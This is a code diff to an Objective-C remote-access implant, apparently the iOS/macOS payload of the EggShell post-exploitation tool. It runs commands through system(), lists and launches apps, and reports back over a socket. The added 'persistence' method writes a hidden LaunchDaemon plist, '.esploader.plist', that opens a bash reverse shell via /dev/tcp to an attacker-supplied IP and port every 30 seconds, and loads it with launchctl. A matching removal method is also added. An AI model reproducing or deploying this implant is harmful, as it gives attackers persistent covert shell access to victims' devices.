@@ -1,8 +1,9 @@
 #import "espl.h"
+CFArrayRef SBSCopyApplicationDisplayIdentifiers(bool onlyActive, bool debuggable);
 
 @implementation espl
+    
 @synthesize recorder;
-CFArrayRef SBSCopyApplicationDisplayIdentifiers(bool onlyActive, bool debuggable);
 
 -(id)init {
     TERM = @"EOF6D2ONE";
@@ -422,7 +423,6 @@ int sockfd;
 #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
     system([command UTF8String]);
 #pragma GCC diagnostic pop
-    [self blank];
 }
 
 -(void)vibrate {
@@ -546,17 +546,24 @@ int sockfd;
     #pragma GCC diagnostic pop
 }
 
+
 -(void)listapps {
     NSString *apps = @"";
     CFArrayRef ary = SBSCopyApplicationDisplayIdentifiers(false, false);
-    for(CFIndex i = 0; i < CFArrayGetCount(ary); i++) {
-        if (CFArrayGetValueAtIndex(ary, i)) {
-            apps = [NSString stringWithFormat:@"%@%@\n",apps,CFArrayGetValueAtIndex(ary, i)];
+    if (ary != NULL) {
+        for(CFIndex i = 0; i < CFArrayGetCount(ary); i++) {
+            if (CFArrayGetValueAtIndex(ary, i)) {
+                apps = [NSString stringWithFormat:@"%@%@\n",apps,CFArrayGetValueAtIndex(ary, i)];
+            }
         }
+        [self sendString:apps:_skey];
     }
-    [self sendString:apps:_skey];
+    else {
+        [self sendString:@"could not SBSCopyApplicationDisplayIdentifiers":_skey];
+    }
 }
 
+    
 -(void)launchApp:(NSArray *)args {
     if ([args count] >= 2) {
         int ret;
@@ -576,7 +583,42 @@ int sockfd;
     else {
         [self sendString:@"Usage: open BundleIdentifier":_skey];
     }
+}
 
+-(void)persistence:(NSString *)ip :(int)port {
+    NSString *loaderpath = @"/Library/LaunchDaemons/.esploader.plist";
+    if ([_fileManager fileExistsAtPath:loaderpath]) {
+        [self sendString:@"Persistence already installed":_skey];
+    }
+    else {
+        NSString *plist = [NSString stringWithFormat:@"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
+        <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\
+        <plist version=\"1.0\"><dict><key>Label</key>\
+        <string>com.example.touchsomefile</string>\
+        <key>ProgramArguments</key>\
+        <array><string>bash</string><string>-c</string>\
+        <string>bash &gt;&amp; /dev/tcp/%@/%d 0&gt;&amp;1</string>\
+        </array><key>RunAtLoad</key><true/>\
+        <key>StartInterval</key><integer>30</integer>\
+        </dict></plist>",ip,port];
+        [plist writeToFile:@"/Library/LaunchDaemons/.esploader.plist"
+                atomically:true
+                  encoding:NSUTF8StringEncoding
+                     error:nil];
+        [self exec:[NSString stringWithFormat:@"launchctl load %@",loaderpath]];
+        [self sendString:@"Persistence Installed":_skey];
+    }
+}
+-(void)rmpersistence {
+    NSString *loaderpath = @"/Library/LaunchDaemons/.esploader.plist";
+    if ([_fileManager fileExistsAtPath:loaderpath]) {
+        [self exec:[NSString stringWithFormat:@"launchctl unload %@",loaderpath]];
+        [_fileManager removeItemAtPath:loaderpath error:NULL];
+        [self sendString:@"Persistence removed":_skey];
+    }
+    else {
+        [self sendString:@"Persistence not installed":_skey];
+    }
 }
 
 //MARK: EggShell Pro
